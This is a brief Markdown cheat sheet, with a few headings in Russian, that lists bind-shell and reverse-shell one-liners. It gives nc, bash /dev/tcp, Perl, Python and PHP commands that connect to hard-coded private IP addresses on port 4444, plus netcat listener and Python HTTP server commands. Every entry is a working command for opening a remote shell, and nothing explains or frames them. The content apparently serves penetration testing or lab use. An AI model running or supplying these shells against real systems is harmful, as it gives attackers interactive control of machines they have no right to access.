#Bind Shell

##Nc
`nc -lvp 4444 -e /bin/sh`

##Web-сервер
`python3 -m http.server`

##Подключение
`nc 192.168.1.135 4444`

#Reverse Shell

##Tcp Linux
`bash -i >& /dev/tcp/172.15.9.212/4444 0>&1`

##Nc

`nc 10.0.2.15 4444 -e /bin/bash`

##Perl

`perl -e 'use Socket;$i="192.168.1.135";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

##Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.135",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


##Php
`php -r '$sock=fsockopen("192.168.1.135",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

##Создание сервера
`nc -lvp 4444`